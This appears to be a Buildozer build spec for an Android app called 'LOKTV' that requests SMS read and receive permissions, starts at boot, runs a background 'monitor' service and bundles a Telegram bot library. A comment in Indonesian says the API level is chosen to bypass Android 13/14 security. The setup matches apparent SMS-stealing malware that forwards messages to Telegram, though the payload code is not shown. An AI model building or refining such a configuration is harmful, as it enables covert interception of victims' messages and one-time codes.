[app]
title = LOKTV
package.name = loktv_v3
package.domain = org.app
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.3
requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius
android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED
# Gunakan API 30 untuk bypass keamanan ketat Android 13/14
android.api = 30
android.minapi = 21
android.ndk = 25b
android.archs = arm64-v8a, armeabi-v7a
services = monitor:main.py
[buildozer]
log_level = 2
